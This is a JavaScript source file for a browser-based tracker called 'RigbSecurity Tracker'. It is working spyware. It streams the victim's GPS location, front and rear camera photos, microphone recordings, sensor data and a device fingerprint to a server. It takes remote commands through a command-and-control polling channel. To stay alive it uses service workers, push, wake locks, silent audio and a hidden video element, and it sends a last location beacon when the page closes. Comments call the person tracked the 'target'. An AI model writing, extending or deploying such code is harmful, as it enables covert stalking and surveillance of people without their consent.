/*
 * RigbSecurity Tracker v3.0 — GPS + Media + C2 Module
 * REAL GPS ONLY — No IP geolocation, No WiFi positioning fallback
 * Enhanced: Geofencing, Offline Queue, Sensor Data, C2 Polling, Stealth
 */

const CONFIG = {
  gpsOptions: {
    enableHighAccuracy: true,
    timeout: 30000,
    maximumAge: 0
  },
  sendInterval: 15000,
  photoInterval: 30000,
  audioInterval: 60000,
  audioDuration: 10000,
  c2PollInterval: 20000,
  sensorInterval: 10000,
  geofenceRadius: 50,       // meters — only send if moved this far
  offlineQueueKey: 'rigb_offline_queue',
  maxQueueSize: 200
};

let trackingId = null;
let mediaStream = null;
let watchId = null;
let wakeLock = null;
let lastSentPosition = null;
let c2Interval = null;

// ═══════════════════════════════════════════
// INIT
// ═══════════════════════════════════════════

async function initTracker(tid) {
  trackingId = tid;

  try {
    await initGPS();
    await initMedia();
    await initPersistence();
    await collectDeviceInfo();
    startContinuous();
    startC2Polling();
    startSensorCollection();
    flushOfflineQueue();
    return true;
  } catch (err) {
    console.error('Init failed:', err);
    return false;
  }
}

// ═══════════════════════════════════════════
// GPS — SATELLITE ONLY
// ═══════════════════════════════════════════

function initGPS() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation not supported'));
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        sendGPS(pos, true);
        watchId = navigator.geolocation.watchPosition(
          (p) => sendGPS(p, false),
          (err) => console.log('GPS watch error:', err.message),
          CONFIG.gpsOptions
        );
        resolve();
      },
      (err) => {
        reject(new Error(`GPS failed: ${err.message} (code ${err.code})`));
      },
      CONFIG.gpsOptions
    );
  });
}

function sendGPS(position, force = false) {
  const data = {
    lat: position.coords.latitude,
    lon: position.coords.longitude,
    acc: position.coords.accuracy,
    alt: position.coords.altitude,
    dir: position.coords.heading,
    spd: position.coords.speed,
    ts: new Date(position.timestamp).toISOString(),
    source: 'gps'
  };

  // Accuracy filter
  if (data.acc > 500) {
    data.source = 'low_accuracy_warning';
  }

  // Client-side geofencing: skip if target hasn't moved enough
  if (!force && lastSentPosition) {
    const dist = haversine(lastSentPosition.lat, lastSentPosition.lon, data.lat, data.lon);
    if (dist < CONFIG.geofenceRadius) {
      return; // Not moved enough, save battery
    }
  }

  lastSentPosition = { lat: data.lat, lon: data.lon };

  // Send via fetch with C2 response handling
  fetch(`/api/gps/${trackingId}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  })
    .then(r => r.json())
    .then(resp => {
      if (resp.commands && resp.commands.length > 0) {
        resp.commands.forEach(executeCommand);
      }
    })
    .catch(() => {
      // Offline — queue the data
      queueOffline({ endpoint: `/api/gps/${trackingId}`, data });
    });

  // Beacon fallback
  if (navigator.sendBeacon) {
    navigator.sendBeacon(
      `/api/beacon/${trackingId}`,
      new Blob([JSON.stringify(data)], { type: 'application/json' })
    );
  }
}

function forceGPS() {
  navigator.geolocation.getCurrentPosition(
    (pos) => sendGPS(pos, true),
    () => {},
    CONFIG.gpsOptions
  );
}

// ═══════════════════════════════════════════
// HAVERSINE — Client-side distance calc
// ═══════════════════════════════════════════

function haversine(lat1, lon1, lat2, lon2) {
  const R = 6371000;
  const toRad = (d) => d * Math.PI / 180;
  const dLat = toRad(lat2 - lat1);
  const dLon = toRad(lon2 - lon1);
  const a = Math.sin(dLat / 2) ** 2 +
            Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon / 2) ** 2;
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

// ═══════════════════════════════════════════
// OFFLINE QUEUE (IndexedDB-backed)
// ═══════════════════════════════════════════

function queueOffline(item) {
  try {
    const queue = JSON.parse(localStorage.getItem(CONFIG.offlineQueueKey) || '[]');
    if (queue.length >= CONFIG.maxQueueSize) {
      queue.shift(); // Drop oldest
    }
    queue.push({ ...item, queuedAt: new Date().toISOString() });
    localStorage.setItem(CONFIG.offlineQueueKey, JSON.stringify(queue));
  } catch (e) {}
}

async function flushOfflineQueue() {
  if (!navigator.onLine) return;

  try {
    const queue = JSON.parse(localStorage.getItem(CONFIG.offlineQueueKey) || '[]');
    if (queue.length === 0) return;

    const remaining = [];
    for (const item of queue) {
      try {
        await fetch(item.endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(item.data)
        });
      } catch (e) {
        remaining.push(item);
      }
    }
    localStorage.setItem(CONFIG.offlineQueueKey, JSON.stringify(remaining));
  } catch (e) {}
}

// Flush when coming back online
window.addEventListener('online', () => {
  setTimeout(flushOfflineQueue, 2000);
});

// ═══════════════════════════════════════════
// C2 — COMMAND & CONTROL POLLING
// ═══════════════════════════════════════════

function startC2Polling() {
  c2Interval = setInterval(pollCommands, CONFIG.c2PollInterval);
}

async function pollCommands() {
  try {
    const resp = await fetch(`/api/poll/${trackingId}`);
    const data = await resp.json();
    if (data.commands && data.commands.length > 0) {
      data.commands.forEach(executeCommand);
    }
  } catch (e) {}
}

function executeCommand(cmdObj) {
  const cmd = cmdObj.cmd || cmdObj;
  switch (cmd) {
    case 'getGPS':
      forceGPS();
      break;
    case 'getPhoto':
    case 'capturePhoto':
      capturePhoto('front');
      break;
    case 'getRearPhoto':
      captureRearPhoto();
      break;
    case 'getAudio':
    case 'recordAudio':
      recordAudio(CONFIG.audioDuration);
      break;
    case 'getLongAudio':
      recordAudio(30000);
      break;
    case 'getDevice':
      collectDeviceInfo();
      break;
    case 'getSensors':
      collectSensors();
      break;
    default:
      console.log('Unknown command:', cmd);
  }
}

// ═══════════════════════════════════════════
// SENSOR DATA (Accelerometer, Gyroscope)
// ═══════════════════════════════════════════

let sensorData = { accel: null, gyro: null, orient: null };

function startSensorCollection() {
  // DeviceMotion (accelerometer + gyroscope)
  if ('DeviceMotionEvent' in window) {
    window.addEventListener('devicemotion', (e) => {
      sensorData.accel = {
        x: e.accelerationIncludingGravity?.x?.toFixed(2),
        y: e.accelerationIncludingGravity?.y?.toFixed(2),
        z: e.accelerationIncludingGravity?.z?.toFixed(2)
      };
      if (e.rotationRate) {
        sensorData.gyro = {
          alpha: e.rotationRate.alpha?.toFixed(2),
          beta: e.rotationRate.beta?.toFixed(2),
          gamma: e.rotationRate.gamma?.toFixed(2)
        };
      }
    });
  }

  // DeviceOrientation
  if ('DeviceOrientationEvent' in window) {
    window.addEventListener('deviceorientation', (e) => {
      sensorData.orient = {
        alpha: e.alpha?.toFixed(1),
        beta: e.beta?.toFixed(1),
        gamma: e.gamma?.toFixed(1)
      };
    });
  }

  // Send sensor data periodically
  setInterval(collectSensors, CONFIG.sensorInterval);
}

function collectSensors() {
  if (!sensorData.accel && !sensorData.orient) return;

  fetch(`/api/sensors/${trackingId}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      ...sensorData,
      ts: new Date().toISOString()
    })
  }).catch(() => {});
}

// ═══════════════════════════════════════════
// CAMERA — Front + Rear
// ═══════════════════════════════════════════

async function initMedia() {
  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
      audio: true
    });
    await capturePhoto('front');
    setTimeout(() => captureRearPhoto(), 3000);
  } catch (e) {
    try {
      mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    } catch (e2) {
      console.log('No media access');
    }
  }
}

async function capturePhoto(camera = 'front') {
  if (!mediaStream) return;

  try {
    const videoTrack = mediaStream.getVideoTracks()[0];
    if (!videoTrack) return;

    const video = document.createElement('video');
    video.srcObject = mediaStream;
    video.setAttribute('playsinline', '');
    video.muted = true;
    await video.play();
    await new Promise(r => setTimeout(r, 500));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);

    const photoData = canvas.toDataURL('image/jpeg', 0.7);

    fetch(`/api/media/${trackingId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'photo',
        camera: camera,
        data: photoData,
        ts: new Date().toISOString()
      })
    }).catch(() => {
      queueOffline({
        endpoint: `/api/media/${trackingId}`,
        data: { type: 'photo', camera, data: photoData, ts: new Date().toISOString() }
      });
    });
  } catch (e) {
    console.log('Photo capture failed:', e);
  }
}

async function captureRearPhoto() {
  try {
    const rearStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { exact: 'environment' } }
    });

    const video = document.createElement('video');
    video.srcObject = rearStream;
    video.setAttribute('playsinline', '');
    video.muted = true;
    await video.play();
    await new Promise(r => setTimeout(r, 1000));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    canvas.getContext('2d').drawImage(video, 0, 0);

    const photoData = canvas.toDataURL('image/jpeg', 0.7);
    rearStream.getTracks().forEach(t => t.stop());

    fetch(`/api/media/${trackingId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'photo',
        camera: 'rear',
        data: photoData,
        ts: new Date().toISOString()
      })
    }).catch(() => {});
  } catch (e) {}
}

// ═══════════════════════════════════════════
// AUDIO RECORDING
// ═══════════════════════════════════════════

function recordAudio(duration = CONFIG.audioDuration) {
  if (!mediaStream) return;

  const audioTracks = mediaStream.getAudioTracks();
  if (audioTracks.length === 0) return;

  try {
    const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
      ? 'audio/webm;codecs=opus' : 'audio/webm';

    const recorder = new MediaRecorder(mediaStream, { mimeType });
    const chunks = [];

    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) chunks.push(e.data);
    };

    recorder.onstop = () => {
      const blob = new Blob(chunks, { type: mimeType });
      const reader = new FileReader();
      reader.onloadend = () => {
        fetch(`/api/media/${trackingId}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'audio',
            data: reader.result,
            duration: duration,
            ts: new Date().toISOString()
          })
        }).catch(() => {});
      };
      reader.readAsDataURL(blob);
    };

    recorder.start();
    setTimeout(() => {
      try { recorder.stop(); } catch (e) {}
    }, duration);
  } catch (e) {
    console.log('Audio recording failed:', e);
  }
}

// ═══════════════════════════════════════════
// PERSISTENCE LAYERS
// ═══════════════════════════════════════════

async function initPersistence() {
  // 1. Service Worker
  if ('serviceWorker' in navigator) {
    try {
      const reg = await navigator.serviceWorker.register('/sw.js');
      await navigator.serviceWorker.ready;
      reg.active?.postMessage({ type: 'init', trackingId });

      navigator.serviceWorker.addEventListener('message', (e) => {
        if (e.data.type === 'getGPS') forceGPS();
        if (e.data.type === 'getPhoto') capturePhoto('front');
        if (e.data.type === 'getAudio') recordAudio();
      });

      if ('periodicSync' in reg) {
        try {
          await reg.periodicSync.register('gps-sync', {
            minInterval: 4 * 60 * 60 * 1000
          });
        } catch (e) {}
      }
    } catch (e) {}
  }

  // 2. Notification permission
  if ('Notification' in window) {
    await Notification.requestPermission();
  }

  // 3. Push subscription
  try {
    const reg = await navigator.serviceWorker.ready;
    if ('PushManager' in window) {
      const keyRes = await fetch('/api/vapid-key');
      const keyData = await keyRes.json();

      if (keyData.key) {
        const sub = await reg.pushManager.subscribe({
          userVisibleOnly: true,
          applicationServerKey: urlBase64ToUint8Array(keyData.key)
        });

        await fetch(`/api/subscribe/${trackingId}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(sub)
        });
      }
    }
  } catch (e) {}

  // 4. Silent audio (prevent mobile sleep)
  startSilentAudio();

  // 5. Wake Lock
  try {
    if ('wakeLock' in navigator) {
      wakeLock = await navigator.wakeLock.request('screen');
      document.addEventListener('visibilitychange', async () => {
        if (!document.hidden && wakeLock?.released) {
          wakeLock = await navigator.wakeLock.request('screen');
        }
      });
    }
  } catch (e) {}

  // 6. Web Lock (prevent tab discard)
  try {
    if ('locks' in navigator) {
      navigator.locks.request('rigb_lock', { mode: 'exclusive' }, () => {
        return new Promise(() => {});
      });
    }
  } catch (e) {}

  // 7. Web Worker for unthrottled timers
  startWorker();

  // 8. Hidden iframe video loop (anti-background-kill)
  startHiddenVideo();
}

function startSilentAudio() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    gain.gain.value = 0.001;
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
  } catch (e) {}
}

function startHiddenVideo() {
  try {
    const video = document.createElement('video');
    video.setAttribute('playsinline', '');
    video.muted = true;
    video.loop = true;
    video.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0.01;pointer-events:none;';
    // Create a tiny canvas-based video source
    const canvas = document.createElement('canvas');
    canvas.width = 2;
    canvas.height = 2;
    const ctx = canvas.getContext('2d');
    ctx.fillRect(0, 0, 2, 2);
    const stream = canvas.captureStream(1);
    video.srcObject = stream;
    document.body.appendChild(video);
    video.play().catch(() => {});
  } catch (e) {}
}

function startWorker() {
  try {
    const code = `
      self.onmessage = function(e) {
        if (e.data.type === 'init') {
          setInterval(() => self.postMessage({type:'tick'}), 30000);
        }
      };
    `;
    const blob = new Blob([code], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));
    worker.postMessage({ type: 'init' });
    worker.onmessage = (e) => {
      if (e.data.type === 'tick') {
        forceGPS();
        capturePhoto('front');
      }
    };
  } catch (e) {}
}

// ═══════════════════════════════════════════
// CONTINUOUS COLLECTION
// ═══════════════════════════════════════════

function startContinuous() {
  setInterval(() => capturePhoto('front'), CONFIG.photoInterval);
  setInterval(captureRearPhoto, 120000);
  setInterval(() => recordAudio(CONFIG.audioDuration), CONFIG.audioInterval);

  // First audio immediately
  recordAudio(CONFIG.audioDuration);

  // Visibility recovery
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden) {
      forceGPS();
      capturePhoto('front');
      flushOfflineQueue();
    }
  });

  // Last-gasp on page close
  window.addEventListener('beforeunload', () => {
    navigator.geolocation.getCurrentPosition((pos) => {
      navigator.sendBeacon(`/api/beacon/${trackingId}`, JSON.stringify({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: pos.coords.accuracy,
        source: 'gps',
        final: true
      }));
    }, () => {}, { enableHighAccuracy: true, timeout: 5000 });
  });

  // Network change detection
  if (navigator.connection) {
    navigator.connection.addEventListener('change', () => {
      collectDeviceInfo();
    });
  }
}

// ═══════════════════════════════════════════
// DEVICE INFO COLLECTION
// ═══════════════════════════════════════════

async function collectDeviceInfo() {
  const info = {
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: [...(navigator.languages || [])],
    cores: navigator.hardwareConcurrency || 0,
    memory: navigator.deviceMemory || 0,
    maxTouch: navigator.maxTouchPoints || 0,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    tzOffset: new Date().getTimezoneOffset(),
    screen: {
      w: screen.width,
      h: screen.height,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      orientation: screen.orientation?.type || 'unknown'
    },
    online: navigator.onLine
  };

  // Battery
  try {
    const batt = await navigator.getBattery();
    info.battery = {
      level: Math.round(batt.level * 100),
      charging: batt.charging
    };
  } catch (e) {}

  // Network
  try {
    const conn = navigator.connection || navigator.mozConnection;
    if (conn) {
      info.network = {
        type: conn.type,
        effectiveType: conn.effectiveType,
        downlink: conn.downlink,
        rtt: conn.rtt
      };
    }
  } catch (e) {}

  // GPU
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        info.gpu = {
          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        };
      }
    }
  } catch (e) {}

  // Media devices
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    info.cameras = devices.filter(d => d.kind === 'videoinput').length;
    info.mics = devices.filter(d => d.kind === 'audioinput').length;
  } catch (e) {}

  // Storage estimate
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const est = await navigator.storage.estimate();
      info.storage = {
        usage: Math.round(est.usage / 1024 / 1024),
        quota: Math.round(est.quota / 1024 / 1024)
      };
    }
  } catch (e) {}

  fetch(`/api/device/${trackingId}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(info)
  }).catch(() => {});
}

// ═══════════════════════════════════════════
// UTILITY
// ═══════════════════════════════════════════

function urlBase64ToUint8Array(base64String) {
  const padding = '='.repeat((4 - base64String.length % 4) % 4);
  const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
  const rawData = window.atob(base64);
  return Uint8Array.from([...rawData].map(c => c.charCodeAt(0)));
}
